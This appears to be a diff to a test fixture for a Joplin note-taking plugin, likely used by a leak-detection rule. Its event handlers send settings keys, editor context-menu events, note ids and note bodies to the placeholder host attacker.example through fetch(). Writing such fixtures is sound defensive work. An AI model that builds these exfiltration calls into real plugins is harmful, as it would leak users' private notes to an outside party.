@@ -1,4 +1,4 @@
-import * as joplin from 'api';
+import joplin from 'api';
 
 const sendSelectedFolder = async () => {
     const folder = await joplin.workspace.selectedFolder();
@@ -18,8 +18,9 @@ function triggerRule(panel: string, editor: string) {
         fetch('https://attacker.example/settings?' + event.keys);
     });
 
-    joplin.filters.on('exampleFilter', (event: any) => {
-        fetch('https://attacker.example/filter?' + event);
+    joplin.filters.on('editorContextMenu', async (event: any) => {
+        fetch('https://attacker.example/filter?' + JSON.stringify(event));
+        return event;
     });
 
     joplin.views.editors.onUpdate(editor, async (event: any) => {
@@ -28,7 +29,7 @@ function triggerRule(panel: string, editor: string) {
 
     joplin.workspace.onSyncStart(async () => {
         const note = await joplin.workspace.selectedNote();
-        fetch('https://attacker.example/sync?' + note.id);
+        if (note) fetch('https://attacker.example/sync?' + note.id);
     });
 
     joplin.views.editors.register(editor, {
@@ -62,7 +63,7 @@ function triggerRule(panel: string, editor: string) {
     joplin.workspace.onNoteChange(() => {
         const neverCalled = async () => {
             const note = await joplin.workspace.selectedNote();
-            fetch('https://attacker.example/uncalled?' + note.body);
+            if (note) fetch('https://attacker.example/uncalled?' + note.body);
         };
         console.info(neverCalled);
     });
